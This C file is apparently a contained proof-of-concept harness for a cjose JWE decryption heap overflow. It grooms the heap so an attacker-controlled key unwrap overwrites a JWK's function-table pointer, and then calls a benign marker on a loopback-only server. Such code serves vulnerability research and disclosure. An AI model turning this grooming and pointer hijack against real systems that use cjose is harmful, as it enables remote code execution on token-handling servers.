/*
 * cjose2shell WMARKER: loopback-only HTTP consumer with a lab fake key table.
 *
 * Derived from w1/server.c. One real HTTP GET on 127.0.0.1, one ephemeral
 * port, no external contact. The JWK is allocated immediately after a
 * 32-byte grooming hole; the hole is freed immediately before decrypt so the
 * vulnerable CEK malloc reuses it. A wire-carried RFC 3394 wrap writes chosen
 * bytes past the CEK into the adjacent JWK, replacing only its fns pointer
 * with the address of a static benign fake table. cjose_jwk_release() calls
 * the marker. No ASLR defeat, no shell, no command execution, no r5 claim.
 */
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <cjose/cjose.h>
#include <cjose/base64.h>
#include <cjose/error.h>
#include "include/jwe_int.h"
#include "include/jwk_int.h"

static const char *JWK_OCT_16 = "{\"kty\":\"oct\", "
                                "\"k\":\"3921VrO5TrLvPQ-NFLlghQ\"}";

static volatile int marker_called = 0;
static void wmarker_marker(cjose_jwk_t *jwk)
{
    (void)jwk;
    marker_called = 1;
    printf("BENIGN_MARKER_EXECUTED\n");
}
/* Deliberately non-static: nm/gdb can confirm the fixed -no-pie address. */
key_fntable wmarker_fake_fntable = { wmarker_marker, NULL, NULL };

static void reply(int fd, int ok)
{
    const char *body = ok ? "OK\n" : "NO\n";
    char hdr[160];
    int n = snprintf(hdr, sizeof(hdr),
                     "HTTP/1.1 %s\r\nContent-Type: text/plain\r\n"
                     "Content-Length: 3\r\nConnection: close\r\n\r\n%s",
                     ok ? "200 OK" : "401 Unauthorized", body);
    (void)write(fd, hdr, (size_t)n);
}

int main(int argc, char **argv)
{
    (void)argc; (void)argv;
    setbuf(stdout, NULL);
    cjose_err err;
    memset(&err, 0, sizeof(err));

    /* Groom: hole first, live JWK in the following heap chunk. */
    void *hole = malloc(32);
    if (!hole) { printf("HOLE_FAIL\n"); return 2; }
    cjose_jwk_t *jwk = cjose_jwk_import(JWK_OCT_16, strlen(JWK_OCT_16), &err);
    if (!jwk) { printf("JWK_FAIL=%d\n", err.code); return 2; }
    long delta = (char *)jwk - (char *)hole;
    printf("HOLE=%p JWK=%p DELTA=%ld KEYDATA=%p KTYPE=%u KEYSIZE=%zu\n",
           hole, (void *)jwk, delta, jwk->keydata,
           (unsigned)jwk->kty, jwk->keysize);
    printf("JWK_PREV_SIZE=%#lx JWK_CHUNK_SIZE=%#lx FAKE_FNS=%p REAL_FNS=%p\n",
           *(unsigned long *)((char *)jwk - 16),
           *(unsigned long *)((char *)jwk - 8),
           (void *)&wmarker_fake_fntable, (void *)jwk->fns);
    printf("LAYOUT CEK_HOLE=%p JWK=%p JWK_MINUS_CEK=%ld FNS_OFFSET_IN_JWK=%zu FNS_MINUS_CEK=%ld FAKE_FNS=%p\n",
           hole, (void *)jwk, delta,
           offsetof(struct _cjose_jwk_int, fns),
           delta + (long)offsetof(struct _cjose_jwk_int, fns),
           (void *)&wmarker_fake_fntable);
    int ls = socket(AF_INET, SOCK_STREAM, 0);
    if (ls < 0) { printf("SOCKET_FAIL\n"); return 2; }
    int one = 1;
    setsockopt(ls, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
    struct sockaddr_in sa;
    memset(&sa, 0, sizeof(sa));
    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    sa.sin_port = 0;
    if (bind(ls, (struct sockaddr *)&sa, sizeof(sa)) < 0 ||
        listen(ls, 1) < 0) { printf("BIND_FAIL\n"); return 2; }
    socklen_t sl = sizeof(sa);
    if (getsockname(ls, (struct sockaddr *)&sa, &sl) < 0) { printf("PORT_FAIL\n"); return 2; }
    printf("PORT=%u\n", (unsigned)ntohs(sa.sin_port));

    int fd = accept(ls, NULL, NULL);
    if (fd < 0) { printf("ACCEPT_FAIL\n"); return 2; }
    char req[32768];
    size_t used = 0;
    while (used < sizeof(req) - 1) {
        ssize_t n = recv(fd, req + used, sizeof(req) - 1 - used, 0);
        if (n <= 0) break;
        used += (size_t)n;
        req[used] = '\0';
        if (strstr(req, "\r\n\r\n")) break;
    }
    printf("REQUEST_BYTES=%zu\n", used);

    char *bearer = strstr(req, "Bearer ");
    if (!bearer) { printf("NO_TOKEN\n"); reply(fd, 0); close(fd); close(ls); return 3; }
    char *tok = bearer + 7;
    char *end = tok;
    while (*end && *end != '\r' && *end != '\n' && *end != ' ') end++;
    *end = '\0';
    printf("TOKEN_BYTES=%zu\n", strlen(tok));

    char *d1 = strchr(tok, '.');
    char *d2 = d1 ? strchr(d1 + 1, '.') : NULL;
    if (!d2) { printf("BAD_TOKEN\n"); reply(fd, 0); close(fd); close(ls); return 3; }
    size_t seg_len = (size_t)(d2 - d1 - 1);
    uint8_t *wire_raw = NULL;
    size_t wire_raw_len = 0;
    cjose_err werr;
    memset(&werr, 0, sizeof(werr));
    int decoded = cjose_base64url_decode(d1 + 1, seg_len, &wire_raw,
                                         &wire_raw_len, &werr);
    printf("WIRE_SEG_B64=%zu WIRE_DECODE=%d WIRE_EK_RAW_LEN=%zu\n",
           seg_len, decoded, decoded ? wire_raw_len : 0);


    cjose_jwe_t *jwe = cjose_jwe_import(tok, strlen(tok), &err);
    printf("IMPORT=%d ERRCODE=%d\n", jwe != NULL, err.code);
    if (!jwe) { reply(fd, 0); close(fd); close(ls); return 3; }
    printf("JWE_CEK_LEN_BEFORE=%zu JWE_EK_RAW_LEN=%zu\n",
           jwe->cek_len, jwe->to[0].enc_key.raw_len);

    /* tcache hands the hole to the vulnerable CEK malloc. */
    free(hole);
    memset(&err, 0, sizeof(err));
    size_t plain_len = 0;
    uint8_t *dec = cjose_jwe_decrypt(jwe, jwk, &plain_len, &err);
    printf("DECRYPT=%d ERRCODE=%d PLAIN_LEN=%zu CEK_LEN_AFTER=%zu\n",
           dec != NULL, err.code, plain_len, jwe->cek_len);
    printf("CEK_PTR=%p GROOM_OK=%d JWK_FNS_NOW=%p FAKE_FNS=%p\n",
           jwe->cek ? (void *)jwe->cek : NULL,
           jwe->cek ? ((char *)jwe->cek == (char *)jwk - delta) : 0,
           (void *)jwk->fns, (void *)&wmarker_fake_fntable);
    printf("PRE_RELEASE kty=%u kid=%p retained=%u keysize=%zu keydata=%p fns=%p\n",
           (unsigned)jwk->kty, (void *)jwk->kid, jwk->retained, jwk->keysize,
           (void *)jwk->keydata, (void *)jwk->fns);

    reply(fd, dec != NULL);
    if (dec) cjose_get_dealloc()(dec);
    if (wire_raw) cjose_get_dealloc()(wire_raw);
    cjose_jwk_release(jwk);       /* calls jwk->fns->free_func(jwk) */
    printf("MARKER_CALLED=%d\n", marker_called);
    /* No cjose_jwe_release(): a long write corrupts unrelated live objects;
     * teardown would fault after the observation. OS reclaims on exit. */
    close(fd);
    close(ls);
    return 0;
}
